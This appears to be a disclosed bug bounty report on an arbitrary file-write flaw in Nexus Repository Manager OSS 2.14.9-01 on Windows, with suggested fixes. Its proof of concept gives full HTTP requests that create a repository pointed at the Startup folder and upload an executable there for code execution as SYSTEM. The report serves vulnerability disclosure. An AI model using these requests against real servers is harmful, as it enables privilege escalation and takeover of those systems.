# Unrestricted File Upload Leading to Remote Code Execution

## Report Details
- **Report ID**: 683965
- **URL**: https://hackerone.com/reports/683965
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-08-28T18:42:12.237Z
- **Disclosed**: 2019-10-30T20:05:22.210Z

## Reporter
- **Username**: hland
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: central-security-project

## Vulnerability Information
### Description
As an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.

In the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. 

The tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.

### Additional Details
Unfortunately I was unable to dig up the functions handling these HTTP requests.

## Steps to reproduce:
1. Create a repo and set the "overrideLocalStorageUrl" to a folder two levels below the one you want to write files to.

`POST /nexus/service/local/repositories`

2. Upload a file to a directory of your choice by manipulating the "g", "a" and "v" parameters

`POST /nexus/service/local/artifact/maven/content`


### Proof-Of-Concept

1. Create repository:

```
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
X-Nexus-UI: true
Content-Length: 443
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
```

2. Upload file

```
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770
Upgrade-Insecure-Requests: 1

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="file"; filename="calc.exe"
Content-Type: text/html

<insert_content_of_calc.exe>
-----------------------------103850373015325909411337083269--


HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 17:05:47 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: text/html;charset=UTF-8
Content-Length: 77
Connection: close

{"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
```

## Patch
There are multiple ways to fix this:

1. Make it the default to run Nexus Repository Manager as a less privileged user. 
2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.

## Additional details

* OS Name:                   Microsoft Windows Server 2016 Datacenter
* OS Version:                10.0.14393 N/A Build 14393

* java version "1.8.0_211"
Java(TM) SE Runtime Environment (build 1.8.0_211-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

My reaction when uploading files to any location on the filesystem:
https://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif

## Impact

The attacker could run arbitrary code on the server as the SYSTEM user.

## Attachments
No attachments
